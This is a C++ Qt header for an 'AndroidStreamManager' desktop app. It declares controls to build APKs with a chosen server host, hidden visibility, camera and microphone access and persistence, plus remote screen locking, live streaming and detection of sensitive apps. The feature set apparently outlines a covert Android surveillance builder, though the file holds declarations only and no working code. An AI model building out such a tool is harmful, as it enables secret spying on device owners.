#ifndef MAIN_WINDOW_H
#define MAIN_WINDOW_H

#include <QMainWindow>
#include <QTimer>
#include <QHeaderView>
#include <QSplitter>
#include <QTabWidget>
#include <memory>
#include "core/device_manager.h"
#include "core/apk_builder.h"

QT_BEGIN_NAMESPACE
class QLabel;
class QListWidget;
class QStackedWidget;
class QPushButton;
class QTextEdit;
class QLineEdit;
class QComboBox;
class QCheckBox;
class QSpinBox;
class QProgressBar;
class QTableWidget;
QT_END_NAMESPACE

namespace AndroidStreamManager {

class MonitoringWidget;
class StreamingViewer;
class AppMonitoringWidget;
class ApkConfigWidget;

class MainWindow : public QMainWindow {
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();

private slots:
    void onBuildApkClicked();
    void onStartStreamClicked();
    void onStopStreamClicked();
    void onPauseStreamClicked();
    void onRestartConnectionClicked();
    void onTerminateSessionClicked();
    void onDeviceSelectionChanged();
    void onUpdateStatistics();

    void showAboutDialog();
    void openDocumentation();
    void loadSettings();
    void saveSettings();
    void setupMenuBar();
    void initializeSystemComponents();
    QString getSelectedDeviceId() const;
    void saveEventLog();
    void onConnectToServer();
    void onDisconnectFromServer();
    void showServerSettings();

    // Monitoramento
    void showMonitoringDashboard();
    void refreshMonitoringData();
    void onAlertReceived(const QString& message, const QString& severity);

    // Streaming Viewer
    void showStreamingViewer();
    void onStreamingStarted(const QString& deviceId);
    void onStreamingStopped(const QString& deviceId);
    void onStreamingError(const QString& error);

    // Controle Remoto de Tela
    void onLockRemoteScreen();
    void onUnlockRemoteScreen();

    // Monitoramento de Apps
    void showAppMonitoringWidget();
    void onAppDetected(const QString& appName, const QString& category);
    void onSensitiveAppDetected(const QString& appName, const QString& category);

    // Configuração APK
    void onSelectIconClicked();
    void onPermissionToggled();
    void onVisibilityChanged(int index);
    
    // Build progress
    void onBuildProgress(int percent, const QString& message);
    void onBuildComplete(const AndroidStreamManager::BuildResult& result);

signals:
    void minimizedToTray();

private:
    void setupUI();
    void setupConnections();
    void updateDeviceList();
    void showEventLog(const std::string& deviceId, const std::string& message);
    
    // Painéis da interface
    void setupApkConfigPanel(QTabWidget* parent = nullptr);
    void setupDeviceControlPanel(QSplitter* parent = nullptr);
    void setupEventLogPanel(QTabWidget* parent = nullptr);
    void setupBuildHistoryPanel(QTabWidget* parent = nullptr);
    void setupRightPanel(QSplitter* parent = nullptr);
    void setupStatusBar();
    void updateBuildHistory();
    
    // Componentes principais
    std::unique_ptr<DeviceManager> deviceManager;
    std::unique_ptr<ApkBuilder> apkBuilder;
    
    // Widgets da interface
    QStackedWidget *mainStack;
    QListWidget *deviceList;
    QTableWidget *buildHistoryTable;
    MonitoringWidget *monitoringWidget;
    StreamingViewer *streamingViewer;
    AppMonitoringWidget *appMonitoringWidget;
    ApkConfigWidget *apkConfigWidget;
    QTextEdit *eventLog;
    QLabel *statusLabel;
    QProgressBar *buildProgress;
    
protected:
    void showEvent(QShowEvent *event) override;
    void closeEvent(QCloseEvent *event) override;
    
    // Configuração APK
    QLineEdit *appNameEdit;
    QLineEdit *serverHostEdit;
    QSpinBox *serverPortSpin;
    QComboBox *visibilityCombo;
    QCheckBox *cameraPermissionCheck;
    QCheckBox *microphonePermissionCheck;
    QCheckBox *persistenceCheck;
    
    QTimer *updateTimer;
};

} // namespace AndroidStreamManager

#endif // MAIN_WINDOW_H